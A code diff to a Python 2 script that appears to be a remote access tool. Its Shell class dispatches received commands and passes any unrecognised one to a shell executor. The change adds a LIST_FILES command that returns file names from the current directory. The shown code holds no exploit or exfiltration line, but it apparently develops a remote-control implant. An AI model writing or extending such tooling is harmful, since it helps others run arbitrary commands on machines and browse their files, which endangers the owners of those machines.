@@ -1,5 +1,5 @@
 #!/usr/bin/env python2
-import socket, subprocess, os, threading, json, base64, datetime, getpass, time, hashlib, random, psutil, zlib
+import socket, subprocess, os, threading, json, base64, datetime, getpass, time, hashlib, random, psutil, zlib, glob
 from Crypto.Cipher import AES
 
 def windows_only(func):
@@ -121,6 +121,9 @@ class Shell:
 			return ""
 		except Exception as e:
 			return str(e)
+			
+	def tab_complete(self, text):
+		return "|".join([f for f in os.listdir('.') if os.path.isfile(f) and f.startswith(text)])
 		
 	def handle_command(self, data):
 		command = data.split()[0]
@@ -138,6 +141,9 @@ class Shell:
 				output = self.set_package_items(arguments)
 		elif command == "cd":
 			output = self.change_directory(arguments)
+		elif command == "LIST_FILES":
+			if not arguments: arguments = ""
+			output = self.tab_complete(arguments)
 		else:
 			output = self.execute_shell_command(command+" "+arguments)
 			
